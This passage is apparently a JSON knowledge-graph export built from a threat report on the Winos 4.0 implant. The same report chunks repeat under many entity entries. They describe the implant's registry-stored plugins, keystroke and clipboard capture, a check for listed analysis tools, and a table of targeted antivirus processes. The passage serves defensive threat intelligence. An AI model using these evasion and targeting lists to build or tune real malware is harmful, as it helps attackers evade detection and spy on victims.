          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Data Collection Procedure",
      "type": "Procedure",
      "id": "procedure--data-collection",
      "description": "创建线程收集剪贴板数据和键盘记录的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Monitoring Software",
      "type": "Target",
      "id": "target--monitoring-software",
      "description": "流量（Flow）、TaskExplorer、Wireshark等监控工具",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "System Information Collection Procedure",
      "type": "Procedure",
      "id": "procedure--system-info-collection",
      "description": "收集受感染机器的IP地址、计算机名称、杀毒软件、操作系统详情和硬件ID的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Windows Registry Paths",
      "type": "Asset",
      "id": "asset--registry-path",
      "description": "HKEY_CURRENT_USER\\Console\\0 (32-bit) 和 HKEY_CURRENT_USER\\Console\\1 (64-bit)",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "登录模块.dll (LoginModule.dll)",
      "type": "Tool",
      "id": "tool--loginmodule-dll",
      "description": "Winos 4.0核心插件管理器，负责处理操作员通过C&C服务器传输的DLL插件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Plugin Management Procedure",
      "type": "Procedure",
      "id": "procedure--plugin-management",
      "description": "通过Windows注册表存储和加载DLL插件以扩展功能的过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Anti-analysis Feature",
      "type": "Tool",
      "id": "tool--antianalysis-feature",
      "description": "检测监控软件并进入休眠模式的功能",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "KSafeTray.exe",
      "type": "Tool",
      "id": "tool--ksafetray-exe",
      "description": "金山安全托盘进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "ZhuDongFangYu.exe",
      "type": "Tool",
      "id": "tool--zhudongfangyu-exe",
      "description": "360主动防御进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "金山（Jinshan）",
      "type": "Tool",
      "id": "tool--jinshan",
      "description": "杀毒软件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
